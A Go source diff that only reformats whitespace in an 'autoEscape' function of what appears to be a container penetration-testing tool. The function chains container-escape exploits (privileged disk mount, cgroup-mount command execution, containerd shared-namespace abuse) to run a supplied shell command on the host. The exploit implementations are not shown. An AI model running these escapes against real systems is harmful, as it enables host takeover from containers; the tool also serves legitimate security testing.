@@ -9,16 +9,16 @@ import (
 	"log"
 )
 
-func autoEscape(shellCommand string) bool{
+func autoEscape(shellCommand string) bool {
 
 	success := false
 	fmt.Printf("\n[Auto Escape - Privileged Container]\n")
 	isPrivContainer := evaluate.GetProcCapabilities()
-	if isPrivContainer{
+	if isPrivContainer {
 		// try to write crontab after running device-mount exploit
 		log.Println("starting to deploy exploit")
-		err,mountedDirs:=exploit.AllDiskMount()
-		if err != nil{
+		err, mountedDirs := exploit.AllDiskMount()
+		if err != nil {
 			log.Println(err)
 		} else {
 			// TODO write to crontab
@@ -28,9 +28,9 @@ func autoEscape(shellCommand string) bool{
 
 		// try to exec shell cmd via cgroup-mount exploit
 		err = exploit.EscapeCgroup(shellCommand)
-		if err != nil{
+		if err != nil {
 			log.Println(err)
-		} else{
+		} else {
 			log.Println("exploit success.")
 			success = true
 		}
@@ -40,15 +40,15 @@ func autoEscape(shellCommand string) bool{
 
 	fmt.Printf("\n[Auto Escape - Shared Net Namespace]\n")
 	err := exploit.ContainerdPwn(shellCommand, "", "")
-	if err != nil{
+	if err != nil {
 		log.Println(err)
 	} else {
 		log.Println("exploit success.")
 		success = true
 	}
+
 	return success
 }
-
 
 // task interface
 type taskAutoEscapeS struct{}
